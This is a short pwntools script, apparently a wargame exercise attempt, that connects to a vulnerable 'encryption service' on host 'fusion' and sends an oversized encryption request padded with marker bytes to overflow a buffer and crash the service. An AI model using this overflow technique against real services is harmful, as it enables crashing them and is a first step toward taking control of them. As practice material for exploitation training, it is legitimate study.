# Attempt nr 2

import struct
import time
import pwn
import sys


RHOST = 'fusion'
RPORT = 20002 
BUFFER_SIZE = 32 * 4096

BANNER = '[-- Enterprise configuration file encryption service --]\n'

def main():
    io = pwn.remote(RHOST, RPORT)
    print(io.recv(len(BANNER)))

    cause_segfault(io)

def send_encryption(io, data):
    command = b'E'
    length_bytes = pwn.p32(len(data))
    command += length_bytes

    # print(len(data))
    # print(int.from_bytes(length_bytes, "big"))
    # print(length_bytes)
    # print(struct.pack("<I", len(data)))

    command += data
    io.send(command)


def send_quit(io):
    io.send(b'Q')
    

def cause_segfault(io):
    payload = b'A' * BUFFER_SIZE
    payload += b'BBBB'
    payload += b'CCCC'
    payload += b'DDDD'
    payload += b'EEEE'
    payload += b'FFFF'

    time.sleep(1)
    send_encryption(io, payload)

    time.sleep(1)
    io.recv(2048)

    time.sleep(1)
    send_quit(io)

if __name__ == "__main__":
    main()
